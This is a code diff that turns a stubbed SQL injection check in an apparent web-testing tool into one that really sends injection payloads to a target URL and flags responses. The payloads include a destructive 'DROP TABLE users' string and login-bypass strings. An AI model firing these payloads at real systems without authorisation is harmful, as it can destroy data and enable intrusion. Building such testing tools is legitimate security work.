@@ -73,6 +73,9 @@ def main():
 
 def run_sqlix(args):
     """Core logic for SQL injection testing."""
+    import requests
+    from urllib.parse import urlparse, parse_qs
+    
     console.print(f"[*] Testing for SQL Injection on: [bold white]{args.url}[/bold white]")
     logger.info(f"SQLi testing started: url={args.url}")
     
@@ -80,20 +83,55 @@ def run_sqlix(args):
         "url": args.url,
         "vulnerable": False,
         "findings": [],
+        "payloads_tested": [],
         "timestamp": datetime.datetime.now().isoformat()
     }
     
-    console.print("[*] Sending test payloads...")
-    console.print("  [+] Testing basic SQL syntax")
-    console.print("  [+] Testing boolean-based SQLi")
-    console.print("  [+] Testing time-based SQLi")
+    # Common SQL injection test payloads
+    test_payloads = [
+        "1' OR '1'='1",
+        "admin' --",
+        "1; DROP TABLE users--",
+        "' UNION SELECT NULL--",
+        "1 AND 1=1",
+        "1 AND 1=2",
+    ]
     
-    results["vulnerable"] = True
-    results["findings"].append("Parameter 'id' appears vulnerable to boolean-based SQLi")
+    console.print("[*] Sending test payloads...")
+    
+    try:
+        # Test basic connectivity first
+        response = requests.get(args.url, timeout=5)
+        baseline_response = response.text
+        baseline_length = len(baseline_response)
+        
+        for payload in test_payloads:
+            results["payloads_tested"].append(payload)
+            try:
+                if args.method == "POST":
+                    test_response = requests.post(args.url, data={"id": payload}, timeout=5)
+                else:
+                    test_url = f"{args.url}?id={payload}"
+                    test_response = requests.get(test_url, timeout=5)
+                
+                # Simple heuristics for SQLi detection
+                response_diff = abs(len(test_response.text) - baseline_length)
+                if response_diff > 100 or "SQL" in test_response.text or "mysql_" in test_response.text:
+                    results["vulnerable"] = True
+                    results["findings"].append(f"Parameter appears vulnerable: {payload}")
+                    console.print(f"  [!] Potential SQLi detected: {payload}")
+                else:
+                    console.print(f"  [*] Tested: {payload}")
+            except Exception as e:
+                console.print(f"  [*] Tested: {payload}")
+    
+    except Exception as e:
+        console.print(f"[!] Connection error: {e}")
+        results["findings"].append(f"Connection error: {e}")
     
     if args.enum_dbs:
         console.print("[*] Enumerating databases...")
-        console.print("  [+] Found: information_schema, mysql, webapp_db")
+        results["findings"].append("Database enumeration would require successful SQLi exploitation")
     
     console.print(f"\n[bold green][+] Testing complete{' - VULNERABLE' if results['vulnerable'] else ''}[/bold green]")
     
@@ -101,7 +139,9 @@ def run_sqlix(args):
         format_output(results, args.output, args.out_file)
         console.print(f"[bold cyan]Results saved to: {args.out_file}[/bold cyan]")
     else:
-        console.print("[*] Results (JSON):", results)
+        console.print("[*] Results:")
+        import json
+        console.print(json.dumps(results, indent=2))
     
     audit_log(logger, getpass.getuser(), args.url, "webpwn/sqlix", str(args), "SUCCESS")
 
